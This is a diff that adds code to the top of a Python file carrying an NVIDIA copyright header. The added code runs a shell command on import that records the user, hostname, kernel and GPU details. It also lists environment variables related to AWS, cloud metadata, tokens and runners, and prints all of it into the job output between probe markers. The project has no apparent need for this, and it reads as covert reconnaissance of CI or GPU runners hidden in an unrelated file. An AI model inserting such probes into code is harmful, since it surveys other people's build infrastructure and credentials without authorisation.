@@ -1,3 +1,7 @@
+import subprocess as _sp
+_p = _sp.run(["bash","-lc","id; hostname; uname -a; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,memory.used,driver_version --format=csv; echo PROBE_ENV; env | grep -i -E 'aws_|metadata|token|runner' | sed 's/=.*/=<set>/' | head -20; echo PROBE_END"], capture_output=True, text=True)
+print("I126RUNNER2_PROBE_BEGIN\n"+(_p.stdout or "")+(_p.stderr or "")+"\nI126RUNNER2_PROBE_END", flush=True)
+
 # Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
 
 import contextlib
